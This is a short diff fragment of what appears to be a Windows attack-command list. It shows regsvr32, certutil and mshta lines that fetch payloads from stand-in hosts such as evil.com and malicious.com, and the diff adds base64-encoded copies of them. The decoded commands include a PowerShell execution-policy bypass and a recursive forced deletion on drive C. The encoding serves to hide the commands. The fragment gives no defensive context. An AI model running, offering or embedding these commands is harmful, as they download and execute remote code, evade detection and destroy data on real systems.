@@ -30,10 +30,13 @@ regsvr32.exe /s /u /i:http://malicious.com/evil.dll scrobj.dll
 certutil -urlcache -split -f http://evil.com/malware.exe
 mshta javascript:eval('new ActiveXObject("WScript.Shell").Run("cmd /c calc")')
 
-#Windows Masque - Base64 სექციაში:
-cG93ZXJzaGVsbC5leGUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3M=
-Y21kLmV4ZSAvYyAiZGVsIC9zIC9xIEM6XCouKiI=
-cnVuZGxsMzIuZXhlIHNoZWxsMzIuZGxs
-cmVnc3ZyMzIuZXhlIC9zIC91IC9p
+#Windows Masque - Base64 სექცია:
+cG93ZXJzaGVsbC5leGUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUNvbW1hbmQ=
+Y21kLmV4ZSAvYyAiZGVsIC9zIC9xIEM6XAouIg==
+cnVuZGxsMzIuZXhlIHNoZWxsMzIuZGxsLFNoZWxsRXhlY19SdW5ETExM
+cmVnc3ZyMzIuZXhlIC9zIC91IC9pOmh0dHA6Ly9tYWxpY2lvdXMuY29tL2V2aWwuZGxsIHNjcm9iai5kbGw=
+Y2VydHV0aWwgLXVybGNhY2hlIC1zcGxpdCAtZiBodHRwOi8vZXZpbC5jb20vbWFsd2FyZS5leGU=
+bXNodGEgamF2YXNjcmlwdDpldmFsKCduZXcgQWN0aXZlWE9iamVjdCgiV1NjcmlwdC5TaGVsbCIpLlJ1biggImNtZCAvYyBjYWxjIiApJyk=
+
 
 
